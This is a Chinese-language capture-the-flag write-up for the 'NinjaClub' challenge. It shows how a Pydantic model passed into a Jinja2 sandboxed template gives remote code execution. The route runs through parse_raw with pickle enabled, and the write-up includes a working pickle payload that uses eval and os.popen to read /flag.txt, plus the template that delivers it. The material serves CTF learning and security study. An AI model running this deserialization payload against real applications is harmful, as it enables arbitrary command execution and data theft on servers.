# NinjaClub

## 题目简述

FastAPI 的 `/preview` 接收一个模板和一个 Pydantic `User` 对象，然后使用 Jinja2 `SandboxedEnvironment` 渲染：

```python
class User(BaseModel):
    name: str
    description: Union[str, None] = None
    age: int

preview = env.from_string(template.source).render(user=user)
```

常见的 `__class__`、`__mro__` 等 Jinja 对象链会被沙箱拦截。真正危险的对象是传入模板的 Pydantic 模型：其 `parse_raw()` 方法允许调用者在显式设置 `allow_pickle=True` 时反序列化 Pickle，而方法参数在模板中完全可控。

## 解题过程

Pydantic 1.x 的 `BaseModel.parse_raw()` 大致经过以下流程：

```text
parse_raw(...)
  -> load_str_bytes(...)
  -> pickle.loads(...)
  -> User.parse_obj(...)
```

当 `content_type='pickle'` 且 `allow_pickle=True` 时，输入会直接送入 `pickle.loads()`。Jinja 沙箱允许调用公开方法 `user.parse_raw`，因此不必逃逸到双下划线属性。

构造一个 Pickle 对象，使反序列化阶段执行命令，同时返回可通过 `User` 校验的字典：

```python
import pickle

class Payload:
    def __reduce__(self):
        expression = (
            "{'name': __import__('os').popen("
            "'cat /flag.txt').read(), 'age': 18}"
        )
        return eval, (expression,)

raw = pickle.dumps(Payload(), protocol=0).decode()
template = (
    "{{ user.parse_raw("
    + repr(raw)
    + ", content_type='pickle', allow_pickle=True).name }}"
)
```

这里选择协议 0 是因为结果是纯文本，便于安全嵌入 JSON 与 Jinja 字符串。反序列化时 `eval()` 执行表达式，`os.popen()` 读取 `/flag.txt`，表达式最终返回：

```python
{"name": "<flag 内容>", "age": 18}
```

`parse_raw()` 随后把它解析成新的 `User` 实例。模板访问 `.name`，因此 flag 直接出现在 `/preview` 响应正文中。

若手工组织协议 0，也可以使用等价的 `GLOBAL builtins eval`、参数元组、`REDUCE` 序列；必须保证最终返回字典而不是命令退出码，否则 Pydantic 后续模型校验会失败。

漏洞入口与最小 Pickle 调用可参考 [R3CTF NinjaClub Writeup](https://cf.mnihyc.com/blog/archives/1814)。外链使用反向 Shell 展示代码执行；本文改为直接读取题目 flag，并补足了“为何反序列化后仍能通过 Pydantic 校验”这一关键条件。

## 方法总结

沙箱安全不只取决于模板引擎自身，还取决于传给模板的对象能力。即使所有危险的 Python 内省属性都被拦截，一个带有反序列化、文件访问或网络方法的业务对象也可能成为显式能力泄露。本题最稳妥的载荷不是只执行副作用，而是让 Pickle 返回符合 `User` schema 的对象，从而顺利穿过反序列化后的验证和模板属性访问。
